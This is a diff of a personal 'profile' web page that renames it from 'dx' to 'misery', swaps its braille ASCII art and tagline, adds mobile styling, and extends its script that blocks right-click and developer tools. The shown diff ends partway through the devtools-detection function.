@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>@ dx</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>@ misery</title>
     <style>
         * {
             margin: 0;
@@ -21,8 +21,8 @@
             justify-content: center;
             text-align: center;
             padding: 20px;
+            -webkit-text-size-adjust: 100%;
         }
-        /* LOADING SCREEN */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -64,8 +64,6 @@
             0%, 100% { opacity: 0.3; }
             50% { opacity: 1; }
         }
-
-        /* ENTER BUTTON */
         #enterBtn {
             display: none;
             background: transparent;
@@ -79,6 +77,8 @@
             transition: all 0.3s;
             margin-top: 20px;
             text-transform: uppercase;
+            -webkit-appearance: none;
+            appearance: none;
         }
         #enterBtn:hover {
             color: #fff;
@@ -89,8 +89,6 @@
         #enterBtn.show {
             display: block;
         }
-
-        /* MAIN CONTENT - hidden until after enter */
         #mainContent {
             display: none;
             width: 100%;
@@ -101,11 +99,10 @@
             flex-direction: column;
             align-items: center;
         }
-
         .ascii-art {
             font-family: 'Courier New', monospace;
-            font-size: clamp(4px, 0.9vw, 11px);
-            line-height: 1.15;
+            font-size: clamp(6px, 1.2vw, 14px);
+            line-height: 1.2;
             color: #cccccc;
             white-space: pre;
             letter-spacing: 0px;
@@ -155,7 +152,6 @@
         .ascii-art {
             animation: glitch 6s infinite ease-in-out, pulse 3s infinite ease-in-out, drift 8s infinite ease-in-out;
         }
-
         .tagline {
             font-size: clamp(1.2rem, 4vw, 2.8rem);
             font-weight: 900;
@@ -196,8 +192,6 @@
             background: repeating-linear-gradient(0deg, rgba(255,255,255,0.00) 0px, rgba(255,255,255,0.00) 2px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.03) 4px);
             z-index: 9999;
         }
-
-        /* Kill overlay */
         #kill-overlay {
             display: none;
             position: fixed;
@@ -225,74 +219,70 @@
             animation: killPulse 0.5s infinite alternate;
         }
         @keyframes killPulse { 0% { opacity: 0.6; } 100% { opacity: 1; } }
-
         @media (max-width: 600px) {
             #enterBtn { padding: 14px 30px; font-size: 1rem; letter-spacing: 6px; }
+        }
+        @supports (-webkit-touch-callout: none) {
+            .ascii-art { font-size: clamp(3px, 1.2vw, 10px); }
+            #enterBtn { padding: 16px 40px; font-size: 1.2rem; }
         }
     </style>
 </head>
 <body>
-    <!-- KILL OVERLAY -->
     <div id="kill-overlay">
         <div class="killer-text">⚡ ACCESS DENIED ⚡<br><span style="font-size:0.6rem;color:#661111;">developer tools disabled</span></div>
     </div>
-
-    <!-- LOADING SCREEN -->
     <div id="loadingScreen">
         <div class="loader"></div>
-        <div class="loader-text">LOADING DX</div>
+        <div class="loader-text">LOADING MISERY</div>
     </div>
-
-    <!-- ENTER BUTTON -->
     <button id="enterBtn">ENTER</button>
-
-    <!-- MAIN CONTENT -->
     <div id="mainContent">
         <div class="container" style="width:100%;max-width:900px;display:flex;flex-direction:column;align-items:center;">
             <div class="ascii-art" id="asciiArt">
+⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢄⠢⡑⠌⢆⡃⠘⡠⢈⠱⠌⢓⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢤⣵⠚⣠⢂⠱⢈⠆⡌⠱⠠⢃⠈⣈⠒⠬⢷⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⢛⡹⠗⣠⠊⠤⣁⠒⢀⠆⡑⢌⠢⡀⠕⠢⢴⣻⣏⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢊⡑⢢⢁⡚⢁⣞⠰⡠⠁⠎⡐⢌⠢⡑⣌⠨⢑⡮⠗⡙⢾⣟⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⢄⡘⢄⠢⡀⢊⠜⢣⠁⡜⣰⣌⡆⡱⣒⣤⢳⠐⡱⠐⡌⠌⢟⢯⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠣⢀⠘⡀⠇⠀⡃⠜⡠⠠⠃⡧⠿⡄⡿⠿⠟⡛⢸⡠⢣⠘⠸⢠⠿⣿⣧⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠌⢀⠃⡌⠤⠁⠌⡰⢁⠆⡰⢁⠢⡑⢌⠲⡱⢨⠥⣿⣿⡤⢉⠆⡡⢀⠈⢛⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⢂⠄⡒⠠⡑⠠⡑⠰⡈⠄⡂⠌⡆⠍⣬⠓⡥⡜⣰⣿⣿⣷⣮⠂⡔⢩⠀⠒⠄⢂⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢌⠰⡈⠢⢌⠡⠂⡔⠈⠥⡘⠄⠁⡏⠐⡰⣣⣾⠧⣡⣿⣿⠏⠀⢠⠁⠜⢠⠂⠈⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⡐⢌⠰⣁⠃⠄⠃⢠⠘⠀⡃⠬⣙⡀⠃⠄⢀⠀⣸⣿⣿⣿⣿⢀⡄⣿⡎⠸⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠰⠈⠐⢠⡉⢠⠀⠰⣁⢆⢃⡆⣄⣤⣸⣿⣿⣿⣿⣿⣿⣯⠄⢣⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠄⠐⡜⠸⡧⠂⠵⡐⡌⣻⢾⣿⣿⣿⣿⣿⣿⡿⠟⠁⢈⠂⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠈⡀⠀⠘⡀⠀⠈⠀⠳⡈⡈⢟⣭⣽⣯⣍⡽⠇⡀⠀⠀⡁⠀⠐⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠁⠀⠄⠁⠀⠀⠀⢠⡄⠑⢱⣰⣿⣿⣿⣵⣿⠘⢠⣶⣿⣗⡂⠀⠡⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠐⠈⠠⢈⠀⠀⢠⠿⡏⡀⠈⡺⡿⡻⢛⠏⠇⠁⣿⣿⣿⡿⣵⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠂⠈⠄⡀⢠⣖⢿⣻⡽⠻⣿⢧⡀⠀⠨⢻⡢⣸⣿⣿⣿⠏⣾⡄⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⠠⠁⠀⣰⣳⢾⣏⣷⣻⢷⡙⢿⣻⣽⣦⣟⡧⣿⣿⣿⣟⣞⢯⣷⡀⠀⠀⣃⠐⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠁⢠⠇⣟⣯⢞⡶⣯⣟⣧⡀⠙⡣⢿⡎⣼⣿⣿⡿⣿⡾⣿⣿⡷⣄⠀⠰⠠⠀⠐⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠈⢀⠀⢈⣇⠹⢞⡏⠉⢳⣯⢘⠝⠁⠉⢋⣵⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣦⠂⠁⢂⠀⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠂⠀⣸⠷⣠⣅⡚⠒⠛⠈⠀⠀⣠⣶⣿⣿⣿⣿⢷⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⡂⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠀⠀⢠⣏⢧⢃⡿⣿⣿⣿⣶⣴⣾⣿⣿⣿⠟⢋⡜⢟⣿⣿⢿⣿⣿⣿⣿⣿⣿⡧⡀⠀⠅⠢⠀⡀⢀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢠⠀⢠⠘⠀⠀⡄⠀⠛⢨⣾⠁⠈⣿⣿⣿⣿⣿⠛⣿⠐⣾⠋⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣦⣬⠀⠃⠀⠂⠀⠀⠀⢰⡄⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⡄⣈⠂⠀⠰⡟⢻⠟⣾⣷⣟⠀⢼⣿⣿⠟⠉⠀⣀⣀⠀⣠⣶⣛⣛⡿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣾⣿⣿⣿⡖⠡⠈⠊⠄⠂⠉⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄⠢⠁⠀⠀⠀⠀⢀⣿⣿⣿⣿⣙⣿⣷⠌⠋⠁⠀⠄⠰⡏⢅⣺⣿⣍⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣽⣿⠃⠀⠀⠈⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣛⡏⢔⠋⠙⠢⢀⡤⣵⣿⣿⣿⣿⣿⣮⣯⢿⣟⣿⡿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠛⠿⣿⠿⠿⠛⠃⠀⠄⠡⠐⠈⣽⣿⣿⣿⣿⣿⣿⣿⣷⣿⡟⠿⣿⣿⣿⣿⡿⡿⠟⠁⠀⡀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠉⠁⠈⠁⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⢀⠊
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⡠⣶⣡⣴⡲⠤⠄⣤⣤⣴⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠓⣄⠀⠀⠀⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠜⣓⣽⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⡟⠃⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠡⡀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⣄⠐⢁⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⢁⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠇⠀⠀⢰⠁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡷⣣⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠔⠁⠀⣀⠂⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠬⠂⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠁⠀⣄⢻⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡪⠴⠒⠉⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⡎⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠈⠉⠈⢊⡂⢤⠀⠀⠀⠀⡠⠔⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡰⣱⣿⣿⣿⣿⣿⣿⣿⢻⢚⢿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀⢰⠏⠀⠀⠠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢭⣽⣿⣿⣿⣿⣿⣿⣿⣿⣄⠣⠽⠝⢿⠃⠀⠀⠀⠀⠀⠀⢀⠠⡷⠾⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⢒⢤⣦⠀⠀⠀⠀⠀⠀⠀⠀⣴⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠋⣿⣿⣿⣿⣿⣿⣿⡟⠒⠀⡈⠑⠢⣤⠄⣀⡀⠀⠀⢠⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠾⢿⣿⣿⣟⡋⠁⠀⠀⠰⠀⠀⠀⠑⣦⠒⠛⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣁⠀⠀⠀⠈⠉⠐⠢⠇⡀⠀⣰⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠈⠑⡏⠪⢑⠢⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣷⣄⣀⠀⠀⠀⢸⠀⠀⣠⠼⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣍⠂⠀⠘⡆⠰⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⡇⣰⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍⠻⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠹⣿⣿⣿⣿⣷⠀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣿⣿⣿⣿⣿⣧⡌⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⢿⡿⡿⢿⢿⡿⡿⢿⠿⡿⣿⢿⠿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
             </div>
-            <div class="tagline">DX</div>
-            <div class="sub">ayoko sa mga feeling gods</div>
+            <div class="tagline">MISERY</div>
+            <div class="sub">what's a hightier human to a lowtier god</div>
         </div>
-        <div class="footer">@dx</div>
+        <div class="footer">@misery</div>
     </div>
 
     <script>
     (function() {
-        // ---------- ANTI-DEVTOOLS ----------
+        // ANTI-DEVTOOLS (iOS safe)
         function killPage() {
             if (document.body.dataset.killed === 'true') return;
             document.body.dataset.killed = 'true';
@@ -307,6 +297,10 @@
             try { window.location.href = 'about:blank'; } catch(e) {}
         }
         document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('touchstart', function(e) {
+            if (e.target.closest('button')) return;
+            if (e.touches.length > 1) { e.preventDefault(); return false; }
+        }, { passive: false });
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); killPage(); return false; }
             if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); killPage(); return false; }
@@ -316,23 +310,25 @@
             return true;
         });
         document.addEventListener('dragstart', e => e.preventDefault());
-
+        document.addEventListener('dblclick', function(e) { e.preventDefault(); }, { passive: false });
         function detectDevTools() {
-            const dummy = document.createElement('div');
-            dummy.style.cssText = 'position:absolute;top:-1000px;left:-1000px;width:100px;height:100px;z-index:-9999;';
-            document.body.appendChild(dummy);
-            const rect = dummy.getBoundingClientRect();
-            const isHidden = rect.width === 0 && rect.height === 0;
-            document.body.removeChild(dummy);
-            if (isHidden) killPage();
-            const wDiff = window.outerWidth - window.innerWidth;
-            const hDiff = window.outerHeight - window.innerHeight;
-            if (wDiff > 160 || hDiff > 160) killPage();
+            try {
+                const dummy = document.createElement('div');
+                dummy.style.cssText = 'position:absolute;top:-1000px;left:-1000px;width:100px;height:100px;z-index:-9999;';
+                document.body.appendChild(dummy);
+                const rect = dummy.getBoundingClientRect();
+                const isHidden = rect.width === 0 && rect.height === 0;
+                document.body.removeChild(dummy);
+                if (isHidden) killPage();
